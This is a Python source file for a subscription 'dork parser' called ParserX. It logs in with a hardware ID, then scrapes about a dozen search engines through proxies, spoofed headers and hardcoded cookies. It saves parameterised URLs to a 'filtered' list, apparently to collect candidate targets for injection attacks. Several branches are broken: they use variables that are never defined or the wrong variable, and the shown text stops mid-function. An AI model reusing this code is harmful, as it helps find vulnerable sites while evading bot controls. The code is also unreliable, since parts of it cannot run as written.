try:
    import requests, re, sys, time, os, random, whois, threading, json, os.path, platform, urllib.parse, tkinter, subprocess
    from colorama import Fore, init
    from datetime import datetime
    from bs4 import BeautifulSoup
    from pypresence import Presence
    from tkinter import filedialog
    import pypresence
except:
    print(' Cannot load the packages.'); exit(1)

"""

This has been developed by ExtremeDev, and the author has full rights on this code, any attempt of copying or selling this will be legally banned.

"""

hwid = str(subprocess.check_output('wmic csproduct get uuid'))
get_data = str(subprocess.check_output('wmic csproduct get uuid')).find('\\n')+2
hwid = str(hwid[get_data:-15])

root = tkinter.Tk()
root.withdraw()

os.system('title ParserX - Powered by codebox.dev')

now = datetime.now().strftime("%d-%m-%Y-%H-%M-%S")

dorks, proxies = [], []

time22 = time.time()
client_id = '723782341721325598'
RPC = Presence(client_id=client_id)
try:
    RPC.connect()
    RPC.update(large_image='logo', details='parser.codbox.dev', start=time22)
except:
    print(' Cannot access discord presence.')

title = """
    ____                           _  __    
   / __ \____ ______________  ____| |/ /    
  / /_/ / __ `/ ___/ ___/ _ \/ ___/   /     
 / ____/ /_/ / /  (__  )  __/ /  /   |      
/_/    \__,_/_/  /____/\___/_/  /_/|_|      
 """

values = {
    "links": 0,
    "filtered": 0,
    "errors": 0,
    "cpm1": 0,
    "retries": 0,
    "bad": 0,
    "checked": 0
}

links = []

websearch_engines = [
    "mywebsearch",
    "google",
    "bing",
    "yandex",
    "ask",
    "startpage",
    "baidu",
    "dogpile",
    "yippy",
    "exalead",
    "webopedia",
    "google scholar",
    "ecosia",
    "ecowho",
    "yooz",
    "w3catalog",
    "searx",
    "mailru",
    "rambler",
    "parsijoo"
]

default = {
    "settings": {
        "timeout": 1000,
        "config-path": "configs/",
        "theme": "white"
    },
    "config": {
        "discord-id": "",
        "discord-webhook": "https://"
    }
}

colors = {
    "white": Fore.WHITE,
    "black": Fore.BLACK,
    "red": Fore.RED,
    "yellow": Fore.YELLOW,
    "cyan": Fore.CYAN,
    "blue": Fore.BLUE,
    "magenta": Fore.MAGENTA
}

try:
    init()
except:
    print(' Not able to load colors.')
    colors = []

try:
    if not os.path.exists('results/'):
        os.makedirs('results/{}/'.format(str(now)))
    if not os.path.exists('results/{}/'.format(str(now))):
        os.makedirs('results/{}/'.format(str(now)))
except:
    print(' Cannot create results/{}/ file.'.format(str(now)))
try:
    if not os.path.exists('settings/'):
        os.makedirs('settings/')
        try:
            json.dump(default["settings"], open('settings/settings.json', 'w'))
            json.dump(default["config"], open('settings/config.json', 'w'))
        except:
            print(' Cannot dump configs into settings/'); exit(1)
except:
    print(' Have no access to the settings/'); exit(1)


try:
    settings = json.load(open('settings/settings.json', 'r+'))
    config = json.load(open('settings/config.json', 'r+'))
except:
    print(' Please create the settings.'); exit(1)

if settings['theme'] not in colors or len(colors) == 0:
    print(" No default theme found. Will run with default theme.")

def get_os():
    if platform.platform().startswith('Linux'): return 'linux'
    elif platform.platform().startswith('Windows'): return 'windows'
    else: return 'another'

def CallClear():
    if platform.platform().startswith('Linux'): os.system('clear')
    elif platform.platform().startswith('Windows'): os.system('cls')
    else: os.system('clear')

if not len(colors):
    color = None
elif settings['theme'] == 'default':
    color = 'default'
else:
    color = 'default'

def check_login():
    if os.path.exists('login.psx'):
        try: 
            lines = open('login.psx', 'r').readlines()
            if len(lines) >= 2:
                for each in lines:
                    try: username, password = each.split(':')[0].replace('\n', ''), each.split(':')[1].replace('\n', '')
                    except: return None
                try:
                    return (username, password)
                except:
                    return None
        except:
            return None
    else:
        return False

def login():
    search_login = check_login()
    CallClear()
    if settings['theme'] == 'default' or len(colors): print(colors[settings['theme']] + str(title) + colors['white'])
    else: print(title)
    print(' Powered by {}codbox.dev{}.\n'.format(Fore.LIGHTRED_EX if color is None else Fore.WHITE if color == 'default' else colors[settings['theme']], Fore.WHITE))
    print(' [1] Login\n [2] Quit')
    try: choose = int(input(' > '))
    except: print(' Please eneter a number.'); login()
    if choose == 1:
        if search_login is None or search_login is False:
            try:
                os.remove('login.psx')
            except:
                pass
            CallClear()
            if settings['theme'] == 'default' or len(colors): print(colors[settings['theme']] + str(title) + colors['white'])
            else: print(title)
            print(' Powered by {}codbox.dev{}.\n'.format(Fore.LIGHTRED_EX if color is None else Fore.WHITE if color == 'default' else colors[settings['theme']], Fore.WHITE))
            print(' Enter your username.')
            try: username = input(' > ')
            except: print(' Cannot load that username.')
            if username in ['admin', 'salt', '0x']:
                print(' Please load a valid username haha!'); time.sleep(2); login()
            print(' Load your password.')
            try: password = input(' > ')
            except: print(' Cannot load that password.')
            if password in [' ', '', 'salt', '  ']:
                print(' Please load a valid password haha!'); time.sleep(2); login()
            try:
                url = "https://parser.codbox.dev/dev/api/login"
                headers = {'Content-Type':'application/json'}
                post_data = {
                    'username': username, 
                    'password': password,
                    'hwid': str(hwid)
                }
                r = requests.post(url, headers=headers, json=post_data)
                if "User Logged Successfully" in r.text or "User logged in successfully" in r.text:
                    try:
                        plan = r.json()['Premium']
                    except:
                        print(' Unknown plan.'); time.sleep(2); login()
                    if 'expired: true' in r.text:
                        print(' Your account is expired, please re-new your subscribtion.'); time.sleep(2); login()
                    else:
                        print(' Welcome, {}, your current plan is {}.'.format(str(username), 'Standard' if plan is False else 'Premium')); time.sleep(2)
                        print(' Do you want to enable auto-login? y/n')
                        try: yesornot = input(' > ')
                        except: print(' Please enter a valid value.'); time.sleep(2); login()
                        if yesornot in ['yes', 'ye', 'y', 'ya', 'true']:
                            print(' Creating files.')
                            try:
                                open('login.psx', 'a+', encoding='utf-8').write(str(username) + ':' + str(password))
                            except:
                                print(' Cannot open the file.'); time.sleep(2); login()
                            print(' Dumped the values with success!')
                        menu(username)
                elif "Wrong login information" in r.text or "invalid username/password" in r.text:
                    print(' The username/password are not valid.'); time.sleep(2); login()
                elif "The HWID must be 36 characters long ." in r.text:
                    print("' Please don't try to bypass hwid."); time.sleep(2); login()
                    print(r.text)
            except:
                print(' Our panels are probably down, please try again later.'); time.sleep(2); login()
        if type(search_login) is tuple:
            username = search_login[0]
            password = search_login[1]
            try:
                url = "https://parser.codbox.dev/dev/api/login"
                headers = {'Content-Type':'application/json'}
                post_data = {
                    'username': username, 
                    'password': password,
                    'hwid': str(hwid)
                }
                r = requests.post(url, headers=headers, json=post_data)
                print(r.text)
                if "User Logged Successfully" in r.text or "User logged in successfully" in r.text:
                    try:
                        plan = r.json()['Premium']
                    except:
                        print(' Unknown plan.'); time.sleep(2); login()
                    if 'expired: true' in r.text:
                        print(' Your account is expired, please re-new your subscribtion.'); time.sleep(2); login()
                    else:
                        print(' Welcome, {}, your current plan is {}.'.format(str(username), 'Standard' if plan is False else 'Premium')); time.sleep(2)
                        menu(username)
                elif "Wrong login information" in r.text or "invalid username/password" in r.text:
                    print(' The username/password are not valid.'); time.sleep(2); login()
                elif "The HWID must be 36 characters long ." in r.text:
                    print("' Please don't try to bypass hwid."); time.sleep(2); login()
                    print(r.text)
            except:
                print(' Our panels are probably down, please try again later.'); time.sleep(2); login()
                     
    elif choose == 2:
        sys.exit()
    else:
        login()
def remove_dupes(mylist=None):
    if mylist is None or type(mylist) is not list:
        return None
    else:
        return set(mylist)

def load(path=None):
    if path is None or type(path) is not str:
        return None
    try:
        lines = []
        file_lines = open(path, 'r+', encoding='utf-8').readlines()
        for line in file_lines:
            line = line.replace('\n', '')
            lines.append(line)
    except:
        return False
    return lines

def check(dork, module):
    try: 
        if not 'http' in dork: dork = urllib.parse.quote_plus(dork)
    except: dork = dork
    global proxies
    sess = requests.Session()
    if type(proxies) is not list or len(proxies) == 0:
        proxies = None
    else:
        proxy = random.choice(proxies)
        if len(proxy.split(':')) == 2:
            proxies = {'http': 'http://{}'.format(proxy), 'https': 'https://{}'.format(proxy)}
        else:
            splits = proxy.split(':')
            proxies = {'http': 'socks5://{}:{}@{}:{}'.format(splits[2], splits[3], splits[0], splits[1]), 'https': 'socks5://{}:{}@{}:{}'.format(splits[2], splits[3], splits[0], splits[1])}
    sess.proxies = proxies
    if module == 'bing':
        try:
            url = "https://www.bing.com/search?q={0}&form=QBLH&sp=-1&pq=te&sc=8-2&qs=n&sk=&cvid=254F0EFF8DB7428F94C694DFA7518E18".format(dork)
            headers = {
                "Host":"www.bing.com",
                "Connection":"keep-alive",
                "sec-ch-ua":"\"Google Chrome\";v=\"87\", \" Not;A Brand\";v=\"99\", \"Chromium\";v=\"87\"",
                "sec-ch-ua-mobile":"?0",
                "sec-ch-ua-full-version":"\"87.0.4280.88\"",
                "sec-ch-ua-arch":"\"x86\"",
                "sec-ch-ua-platform":"\"Windows\"",
                "sec-ch-ua-platform-version":"\"10.0\"",
                "sec-ch-ua-model":"\"\"",
                "Upgrade-Insecure-Requests":"1",
                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
                "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "Sec-Fetch-Site":"same-origin",
                "Sec-Fetch-Mode":"navigate",
                "Sec-Fetch-User":"?1",
                "Sec-Fetch-Dest":"document",
                "Referer":"https://www.bing.com/search?q=test&form=QBLH&sp=-1&pq=te&sc=8-2&qs=n&sk=&cvid=254F0EFF8DB7428F94C694DFA7518E18",
                "Accept-Language":"en-US,en;q=0.9,ro;q=0.8",
                "Accept-Encoding":"gzip, deflate"
            }
            r = requests.get(url, headers=headers) 
            if r.status_code != 200:
                values["retries"]+=1;threading.Thread(target=check, args=(dork, module,)).start()
            else:
                links_all = re.findall('<li class="b_algo"><h2><a href="(.*?)" h=', str(r.content))
                if len(links_all) == 0:
                    values['bad']+=1; open('results/{}/blank.txt'.format(str(now)), 'a+', encoding='utf-8').write(dorks+ '\n')
                else:
                    values['checked']+=1
                    for each in links_all:
                        if '=' in each and '?' in each:
                            values['filtered']+=1
                            open('results/{}/filtered.txt'.format(str(now)), 'a+', encoding='utf-8').write(each + '\n')
                        open('results/{}/links.txt'.format(str(now)), 'a+', encoding='utf-8').write(each+ '\n')
                        links.append(each); values['links']+=1; values['cpm1']+=1
        except:
            values['errors']+=1
            threading.Thread(target=check, args=(dork, module,)).start()
    elif module == 'mywebsearch':
        try:
            url = "https://int.search.mywebsearch.com/mywebsearch/GGmain.jhtml?p2=%5EMYWEBSEARCHDEFAULT%5E%5E%5E&n=&ln=en&si=&tpr=hpsb&trs=wtt&brwsid=37CFBAAD-1D00-4D8B-BF07-129CE33C44B3&searchfor={}&st={}".format(dork, dork)
            headers = {"Host":"search.aol.com","Connection":"keep-alive","Cache-Control":"max-age=0","Upgrade-Insecure-Requests":"1","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36","Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","Sec-Fetch-Site":"none","Sec-Fetch-Mode":"navigate","Sec-Fetch-User":"?1","Sec-Fetch-Dest":"document","Accept-Language":"en-US,en;q=0.9","Cookie":"BX=1t0sgmdfhaesu&b=3&s=dn; EuConsent=BO21FRuO21FRaAOABCENDRuAAAAuJ6__f_97_8_v2fdvduz_Ov_j_c__3XWcfPZvcELzhK9Meu_2wzd4u9wNRM5wckx87eJrEso5YzISsG-RMod_7l__3zif9oxPowEc9rz3nZEw6vs2v-ZzBCGJ_I0i; A1=d=AQABBKI7FV8CEAE3jC1_F3vxgmlRHnNIDbsFEgABAQF_Fl83X_Glb2UB_iMAAAcInjsVX7OQgx4&S=AQAAAoxCBbnLoyxE0tXpKb7iJlg; A3=d=AQABBKI7FV8CEAE3jC1_F3vxgmlRHnNIDbsFEgABAQF_Fl83X_Glb2UB_iMAAAcInjsVX7OQgx4&S=AQAAAoxCBbnLoyxE0tXpKb7iJlg; GUC=AQABAQFfFn9fN0IgxQT9; rxx=9sbqwpfv0x.201ue5ul&v=1; sBS=dpr=1&vw=1920&vh=969; x_ms=cltid=9588ed3ee1cb5d96830a56687e8bc938; aolAuthState=ptdwjcel483; A1S=d=AQABBKI7FV8CEAE3jC1_F3vxgmlRHnNIDbsFEgABAQF_Fl83X_Glb2UB_iMAAAcInjsVX7OQgx4&S=AQAAAoxCBbnLoyxE0tXpKb7iJlg&j=GDPR","Accept-Encoding":"gzip, deflate"}
            r = sess.get(url, headers=headers) 
            if r.status_code != 200:
                values["retries"]+=1;threading.Thread(target=check, args=(dork, module,)).start()
            else:
                links_all = re.findall('<h3 class="title"><a class=" ac-algo fz-l ac-21th lh-24" href="(.*?)" referrerpolicy=', str(r.content))
                if len(links_all) == 0:
                    values['bad']+=1; open('results/{}/blank.txt'.format(str(now)), 'a+', encoding='utf-8').write(dorks+ '\n')
                else:
                    values['checked']+=1
                    for each in links_all:
                        if '=' in each and '?' in each:
                            values['filtered']+=1
                            open('results/{}/filtered.txt'.format(str(now)), 'a+', encoding='utf-8').write(each + '\n')
                        open('results/{}/links.txt'.format(str(now)), 'a+', encoding='utf-8').write(each+ '\n')
                        links.append(each); values['links']+=1; values['cpm1']+=1
        except:
            values['errors']+=1
            threading.Thread(target=check, args=(dork, module,)).start()
    elif module == 'google':
        try:
            url = "https://google.com/search?q={}".format(dork)
            headers ={"user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Firefox/65.0"}
            r = sess.get(url, headers=headers)
            if r.status_code != 200:
                values["retries"]+=1;threading.Thread(target=check, args=(dork, module,)).start()
            else:
                links_all = re.findall('<div class="yuRUbf"><a href="(.*?)" data-ved="', str(r.content))
                if len(links_all) == 0:
                    values['bad']+=1; open('results/{}/blank.txt'.format(str(now)), 'a+', encoding='utf-8').write(dorks+ '\n')
                else:
                    values['checked']+=1
                    for each in links_all:
                        if '=' in each and '?' in each:
                            values['filtered']+=1
                            open('results/{}/filtered.txt'.format(str(now)), 'a+', encoding='utf-8').write(each + '\n')
                        open('results/{}/links.txt'.format(str(now)), 'a+', encoding='utf-8').write(each+ '\n')
                        links.append(each); values['links']+=1; values['cpm1']+=1
        except:
            values['errors']+=1
            threading.Thread(target=check, args=(dork, module,)).start()
    elif module == 'yandex':
        try:
            url = "https://yandex.com/search/?text={}&lr=10487".format(dork)
            headers = {"Host":"yandex.com","Connection":"keep-alive","Cache-Control":"max-age=0","device-memory":"8","dpr":"1","viewport-width":"1920","rtt":"100","downlink":"8.75","ect":"4g","Upgrade-Insecure-Requests":"1","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36","Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","Sec-Fetch-Site":"same-origin","Sec-Fetch-Mode":"navigate","Sec-Fetch-User":"?1","Sec-Fetch-Dest":"document","Referer":"https://yandex.com/","Accept-Language":"en-US,en;q=0.9","Cookie":"mda=0; yandex_gid=10488; yandexuid=8265002111595268283; yuidss=8265002111595268283; i=fmmyHmMRyjRUw+ZT9ZtrKjzx3UObaaDwhrG5TqNJKePlh667nXLRbsgdnUBUPfzMyeANwDOee38V2vTRzP/2B1w9jbs=; _ym_wasSynced=%7B%22time%22%3A1595268283528%2C%22params%22%3A%7B%22eu%22%3A1%7D%2C%22bkParams%22%3A%7B%7D%7D; my=YwA=; ys=wprid.1595268290431250-561250269598414749000303-production-app-host-man-web-yp-71; yp=1597860283.ygu.1#1597860295.los.1#1597860295.losc.0#1595873092.szm.1%3A1920x1080%3A1920x969#1595354692.ln_tp.01","Accept-Encoding":"gzip, deflate"}
            r = sess.get(url, headers=headers) 
            if 'Show a different code' in r.text or r.status_code != 200:
                values["retries"]+=1;threading.Thread(target=check, args=(dork, module,)).start()
            else:
                links_all = re.findall('target=_blank href="(.*?)" data-counter=', str(r.content))
                if len(links_all) == 0:
                    values['bad']+=1; open('results/{}/blank.txt'.format(str(now)), 'a+', encoding='utf-8').write(dorks+ '\n')
                else:
                    values['checked']+=1
                    for each in links_all:
                        if each.startswith('/'):
                            pass
                        if '=' in each and '?' in each:
                            values['filtered']+=1
                            open('results/{}/filtered.txt'.format(str(now)), 'a+', encoding='utf-8').write(each + '\n')
                        open('results/{}/links.txt'.format(str(now)), 'a+', encoding='utf-8').write(each+ '\n')
                        links.append(each); values['links']+=1; values['cpm1']+=1
        except:
            values['errors']+=1
            threading.Thread(target=check, args=(dork, module,)).start()
    elif module == 'ask':
        try:
            headers = {
                "Host":"uk.ask.com",
                "Connection":"keep-alive",
                "sec-ch-ua":"\"Google Chrome\";v=\"87\", \" Not;A Brand\";v=\"99\", \"Chromium\";v=\"87\"",
                "sec-ch-ua-mobile":"?0",
                "Upgrade-Insecure-Requests":"1",
                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
                "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "Sec-Fetch-Site":"same-origin",
                "Sec-Fetch-Mode":"navigate",
                "Sec-Fetch-User":"?1",
                "Sec-Fetch-Dest":"document",
                "Referer":"https://uk.ask.com/?o=0&l=dir&ad=dirN",
                "Accept-Language":"en-US,en;q=0.9,ro;q=0.8",
                "Accept-Encoding":"gzip, deflate"
            }
            url = "https://uk.ask.com/web?q={}&qsrc=0&o=0&l=dir&qo=homepageSearchBox".format(dork)
            r = sess.get(url, headers=headers) 
            if 'Show a different code' in r.text or r.status_code != 200:
                values["retries"]+=1;threading.Thread(target=check, args=(dork, module,)).start()
            else:
                links_all = re.findall('rget="_blank" href=\'(.*?)\' data-unified=', str(r.content))
                if len(links_all) == 0:
                    values['bad']+=1; open('results/{}/blank.txt'.format(str(now)), 'a+', encoding='utf-8').write(dorks+ '\n')
                else:
                    values['checked']+=1
                    for each in links_all:
                        if each.startswith('/'):
                            pass
                        if '=' in each and '?' in each:
                            values['filtered']+=1
                            open('results/{}/filtered.txt'.format(str(now)), 'a+', encoding='utf-8').write(each + '\n')
                        open('results/{}/links.txt'.format(str(now)), 'a+', encoding='utf-8').write(each+ '\n')
                        links.append(each); values['links']+=1; values['cpm1']+=1
        except:
            values['errors']+=1
            threading.Thread(target=check, args=(dork, module,)).start()
    elif module == 'startpage':
        try:
            headers = {
                "Host":"www.startpage.com",
                "Connection":"keep-alive",
                "Cache-Control":"max-age=0",
                "sec-ch-ua":"\"Google Chrome\";v=\"87\", \" Not;A Brand\";v=\"99\", \"Chromium\";v=\"87\"",
                "sec-ch-ua-mobile":"?0",
                "Upgrade-Insecure-Requests":"1",
                "Origin":"https://www.startpage.com",
                "Content-Type":"application/x-www-form-urlencoded",
                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
                "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "Sec-Fetch-Site":"same-origin",
                "Sec-Fetch-Mode":"navigate",
                "Sec-Fetch-User":"?1",
                "Sec-Fetch-Dest":"document",
                "Referer":"https://www.startpage.com/",
                "Accept-Language":"en-US,en;q=0.9,ro;q=0.8",
                "Accept-Encoding":"gzip, deflate",
                "Content-Length":"72"
            }
            content = "query=test&lui=english&language=english&cat=web&sc=MpmTyGERAAfc20&abp=-1"
            r = sess.post('https://www.startpage.com/sp/search', headers=headers, data=content) 
            if 'Show a different code' in r.text or r.status_code != 200:
                values["retries"]+=1;threading.Thread(target=check, args=(dork, module,)).start()
            else:
                links_all = re.findall('href="(.*?)"', str(r.content))
                if len(links_all) == 0:
                    values['bad']+=1; open('results/{}/blank.txt'.format(str(now)), 'a+', encoding='utf-8').write(dorks+ '\n')
                else:
                    values['checked']+=1
                    for each in links_all:
                        if each.startswith('/') or not 'http' in each:
                            pass
                        if '=' in each and '?' in each:
                            values['filtered']+=1
                            open('results/{}/filtered.txt'.format(str(now)), 'a+', encoding='utf-8').write(each + '\n')
                        open('results/{}/links.txt'.format(str(now)), 'a+', encoding='utf-8').write(each+ '\n')
                        links.append(each); values['links']+=1; values['cpm1']+=1
        except:
            values['errors']+=1
            threading.Thread(target=check, args=(dork, module,)).start()
    elif module == 'baidu':
        try:
            headers = {
                "Host":"www.baidu.com",
                "Connection":"keep-alive",
                "sec-ch-ua":"\"Google Chrome\";v=\"87\", \" Not;A Brand\";v=\"99\", \"Chromium\";v=\"87\"",
                "sec-ch-ua-mobile":"?0",
                "Upgrade-Insecure-Requests":"1",
                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
                "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "Sec-Fetch-Site":"same-origin",
                "Sec-Fetch-Mode":"navigate",
                "Sec-Fetch-User":"?1",
                "Sec-Fetch-Dest":"document",
                "Referer":"https://www.baidu.com/baidu.html",
                "Accept-Language":"en-US,en;q=0.9,ro;q=0.8",
                "Cookie":"BAIDUID_BFESS=C99F51C2E404CE268BC7A76B0FB4D2C0:FG=1; BAIDUID=ECAA2601395D74CA6FD6736E8E3625CE:FG=1",
                "Accept-Encoding":"gzip, deflate"
            }
            r = requests.get('https://www.baidu.com/s?ie=utf-8&f=8&rsv_bp=1&rsv_idx=1&tn=baidu&wd=test'.replace('test', dork), headers=headers)
            r = sess.get(url, headers=headers) 
            if 'Show a different code' in r.text or r.status_code != 200:
                values["retries"]+=1;threading.Thread(target=check, args=(dork, module,)).start()
            else:
                links_all = re.search('bds.comm.iaurl=(.*?);', str(r.text)).group(1).split(';')
                if len(links_all) == 0:
                    values['bad']+=1; open('results/{}/blank.txt'.format(str(now)), 'a+', encoding='utf-8').write(dorks+ '\n')
                else:
                    values['checked']+=1
                    for each in links_all:
                        if each.startswith('/'):
                            pass
                        if '=' in each and '?' in each:
                            values['filtered']+=1
                            open('results/{}/filtered.txt'.format(str(now)), 'a+', encoding='utf-8').write(each + '\n')
                        open('results/{}/links.txt'.format(str(now)), 'a+', encoding='utf-8').write(each+ '\n')
                        links.append(each); values['links']+=1; values['cpm1']+=1
        except:
            values['errors']+=1
            threading.Thread(target=check, args=(dork, module,)).start()
    elif module == 'yippy':
        try:
            headers = {
                "Host":"www.yippy.com",
                "Connection":"keep-alive",
                "sec-ch-ua":"\"Google Chrome\";v=\"87\", \" Not;A Brand\";v=\"99\", \"Chromium\";v=\"87\"",
                "sec-ch-ua-mobile":"?0",
                "Upgrade-Insecure-Requests":"1",
                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
                "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "Sec-Fetch-Site":"same-origin",
                "Sec-Fetch-Mode":"navigate",
                "Sec-Fetch-User":"?1",
                "Sec-Fetch-Dest":"document",
                "Referer":"https://www.yippy.com/",
                "Accept-Language":"en-US,en;q=0.9,ro;q=0.8",
                "Accept-Encoding":"gzip, deflate"
            }
            r = requests.get('https://www.yippy.com/search?query={}'.format(dork), headers=headers)
            if 'Show a different code' in r.text or r.status_code != 200:
                values["retries"]+=1;threading.Thread(target=check, args=(dork, module,)).start()
            else:
                links_all = re.findall('<div class="field field-title"><span class="values"><span class="value"><a href="(.*?)" class="title"', str(r.content))
                if len(links_all) == 0:
                    values['bad']+=1; open('results/{}/blank.txt'.format(str(now)), 'a+', encoding='utf-8').write(dorks+ '\n')
                else:
                    values['checked']+=1
                    for each in links_all:
                        if each.startswith('/'):
                            pass
                        if '=' in each and '?' in each:
                            values['filtered']+=1
                            open('results/{}/filtered.txt'.format(str(now)), 'a+', encoding='utf-8').write(each + '\n')
                        open('results/{}/links.txt'.format(str(now)), 'a+', encoding='utf-8').write(each+ '\n')
                        links.append(each); values['links']+=1; values['cpm1']+=1
        except:
            values['errors']+=1
            threading.Thread(target=check, args=(dork, module,)).start()
    elif module == 'exalead':
        try:
            headers = {
                "Host":"www.exalead.com",
                "Connection":"keep-alive",
                "sec-ch-ua":"\"Google Chrome\";v=\"87\", \" Not;A Brand\";v=\"99\", \"Chromium\";v=\"87\"",
                "sec-ch-ua-mobile":"?0",
                "Upgrade-Insecure-Requests":"1",
                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
                "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "Sec-Fetch-Site":"same-origin",
                "Sec-Fetch-Mode":"navigate",
                "Sec-Fetch-User":"?1",
                "Sec-Fetch-Dest":"document",
                "Referer":"https://www.exalead.com/search/",
                "Accept-Language":"en-US,en;q=0.9,ro;q=0.8",
                "Accept-Encoding":"gzip, deflate"
            }
            r = requests.get('https://www.exalead.com/search/web/results/?q={}'.format(dork), headers=headers)
            if 'Show a different code' in r.text or r.status_code != 200:
                values["retries"]+=1;threading.Thread(target=check, args=(dork, module,)).start()
            else:
                links_all = re.findall('<a href="(.*?)" >', str(r.content))
                if len(links_all) == 0:
                    values['bad']+=1; open('results/{}/blank.txt'.format(str(now)), 'a+', encoding='utf-8').write(dorks+ '\n')
                else:
                    values['checked']+=1
                    for each in links_all:
                        if each.startswith('/'):
                            pass
                        if '=' in each and '?' in each:
                            values['filtered']+=1
                            open('results/{}/filtered.txt'.format(str(now)), 'a+', encoding='utf-8').write(each + '\n')
                        open('results/{}/links.txt'.format(str(now)), 'a+', encoding='utf-8').write(each+ '\n')
                        links.append(each); values['links']+=1; values['cpm1']+=1
        except:
            values['errors']+=1
            threading.Thread(target=check, args=(dork, module,)).start()
    elif module == 'dogpile':
        try:
            url = "https://www.dogpile.com/serp?q={}&sc=30dPzBHj4GVC20".format(dork)
            headers = {
                "Host":"www.dogpile.com",
                "Connection":"keep-alive",
                "Cache-Control":"max-age=0",
                "sec-ch-ua":"\"Google Chrome\";v=\"87\", \" Not;A Brand\";v=\"99\", \"Chromium\";v=\"87\"",
                "sec-ch-ua-mobile":"?0",
                "Upgrade-Insecure-Requests":"1",
                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
                "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "Sec-Fetch-Site":"same-origin",
                "Sec-Fetch-Mode":"navigate",
                "Sec-Fetch-User":"?1",
                "Sec-Fetch-Dest":"document",
                "Referer":"https://www.dogpile.com/?capv=aafx6dkXbHUa39rtD1PtnGx9deyHUKvMmgfqkdfSxfciaWW2QJPClgDY2nZlqg",
                "Accept-Language":"en-US,en;q=0.9,ro;q=0.",
                "If-None-Match":"W/\"3db1f6c53f677b691859bcefba8319fd\"",
                "Accept-Encoding":"gzip, deflate",
            }
            if 'Show a different code' in r.text or r.status_code != 200:
                values["retries"]+=1;threading.Thread(target=check, args=(dork, module,)).start()
            else:
                links_all = re.findall('<a class="web-bing__title" href="(.*?)" data-thash=', str(r.text))
                if len(links_all) == 0:
                    values['bad']+=1; open('results/{}/blank.txt'.format(str(now)), 'a+', encoding='utf-8').write(dorks+ '\n')
                else:
                    values['checked']+=1
                    for each in links_all:
                        if each.startswith('/'):
                            pass
                        if '=' in each and '?' in each:
                            values['filtered']+=1
                            open('results/{}/filtered.txt'.format(str(now)), 'a+', encoding='utf-8').write(each + '\n')
                        open('results/{}/links.txt'.format(str(now)), 'a+', encoding='utf-8').write(each+ '\n')
                        links.append(each); values['links']+=1; values['cpm1']+=1
        except:
            values['errors']+=1
            threading.Thread(target=check, args=(dork, module,)).start()
    elif module == "webopedia":
        try:
            url = "https://www.webopedia.com/?s={}".format(dork)
            headers = {
                "Host":"www.webopedia.com",
                "Connection":"keep-alive",
                "sec-ch-ua":"\"Google Chrome\";v=\"87\", \" Not;A Brand\";v=\"99\", \"Chromium\";v=\"87\"",
                "sec-ch-ua-mobile":"?0",
                "Upgrade-Insecure-Requests":"1",
                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
                "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "Sec-Fetch-Site":"same-origin",
                "Sec-Fetch-Mode":"navigate",
                "Sec-Fetch-User":"?1",
                "Sec-Fetch-Dest":"document",
                "Referer":"https://www.webopedia.com/",
                "Accept-Language":"en-US,en;q=0.9,ro;q=0.8",
                "Accept-Encoding":"gzip, deflate",
            }
            if 'Show a different code' in r.text or r.status_code != 200:
                values["retries"]+=1;threading.Thread(target=check, args=(dork, module,)).start()
            else:
                links_all = re.findall('<h3 class="entry-title td-module-title"><a href="(.*?)" rel="bookmark"', str(r.text))
                if len(links_all) == 0:
                    values['bad']+=1; open('results/{}/blank.txt'.format(str(now)), 'a+', encoding='utf-8').write(dorks+ '\n')
                else:
                    values['checked']+=1
